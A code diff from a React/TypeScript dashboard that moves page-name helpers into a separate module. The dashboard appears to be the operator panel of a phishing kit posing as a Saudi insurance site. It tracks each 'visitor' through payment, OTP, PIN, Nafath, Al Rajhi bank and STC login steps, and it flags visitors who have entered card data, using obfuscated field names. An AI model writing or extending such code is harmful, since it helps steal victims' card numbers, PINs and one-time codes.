@@ -16,6 +16,7 @@ import { getTimeAgo } from "@/lib/time-utils";
 import { updateApplication } from "@/lib/firebase-services";
 import { _d } from "@/lib/secure-utils";
 import { useState } from "react";
+import { getPageName, getVisitorCurrentPage } from "@/lib/page-names";
 
 export type VisitorFilter = "all" | "hasCard" | "archive";
 
@@ -62,65 +63,8 @@ const toMs = (value: unknown): number => {
   return Number.isNaN(parsed) ? 0 : parsed;
 };
 
-// Get current page name in Arabic
-const getPageName = (step: number | string): string => {
-  if (typeof step === "string") {
-    const stringPageNames: Record<string, string> = {
-      home: "الرئيسية",
-      "home-new": "الرئيسية",
-      insur: "بيانات التأمين",
-      compar: "مقارنة العروض",
-      payment: "الدفع",
-      check: "الدفع",
-      _st1: "الدفع",
-      _t1: "الدفع",
-      otp: "OTP",
-      _t2: "OTP",
-      step2: "OTP",
-      veri: "OTP",
-      pin: "PIN",
-      _t3: "PIN",
-      step3: "PIN",
-      confi: "PIN",
-      phone: "الهاتف",
-      step5: "الهاتف",
-      nafad: "نفاذ",
-      _t6: "نفاذ",
-      step4: "نفاذ",
-      nafad_modal: "نفاذ",
-      rajhi: "الراجحي",
-      "finalOtp": "OTP الأخير",
-      "stc-login": "STC",
-      nafad_confirmation: "نفاذ",
-    };
-    return stringPageNames[step] ?? "غير معروف";
-  }
-
-  const stepNum = typeof step === "number" ? step : parseInt(step);
-  const pageNames: Record<number, string> = {
-    0: "الرئيسية",
-    1: "الرئيسية",
-    2: "بيانات التأمين",
-    3: "مقارنة العروض",
-    4: "الدفع",
-    5: "OTP",
-    6: "PIN",
-    7: "الهاتف",
-    8: "نفاذ",
-    9: "OTP الأخير",
-  };
-
-  return pageNames[stepNum] ?? "غير معروف";
-};
-
 const getVisitorDisplayName = (visitor: InsuranceApplication) =>
   visitor.ownerName || (visitor as any).name || "زائر جديد";
-
-const getVisitorCurrentPage = (visitor: InsuranceApplication) =>
-  (visitor.redirectPage ||
-    visitor.currentPage ||
-    visitor.currentStep ||
-    "home") as number | string;
 
 const hasCardData = (visitor: InsuranceApplication): boolean => {
   if (visitor._v1 || visitor.cardNumber) return true;
